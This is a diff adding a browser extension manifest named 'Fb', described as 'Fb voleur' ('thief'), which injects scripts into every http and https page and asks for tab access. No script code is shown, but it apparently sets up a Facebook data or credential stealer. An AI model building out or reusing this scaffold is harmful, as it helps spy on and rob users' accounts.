@@ -1,0 +1,21 @@
+{
+    "name": "Fb",
+    "version": "1.1",
+    "manifest_version": 2,
+    "description": "Fb voleur",
+    "background": {
+        "scripts": ["external/jquery.js", "background/background.js"]
+    },
+    "permissions": [
+        "tabs", "http://*/*", "https://*/*"
+    ],
+    "browser_action": {
+        "default_title": "Fb",
+        "default_icon": "popup/icon.png",
+        "default_popup": "popup/popup.html"
+    },
+    "content_scripts": [{
+        "matches": ["http://*/*", "https://*/*"],
+        "js": ["external/jquery.js", "content/content.js" ]
+    }]
+}
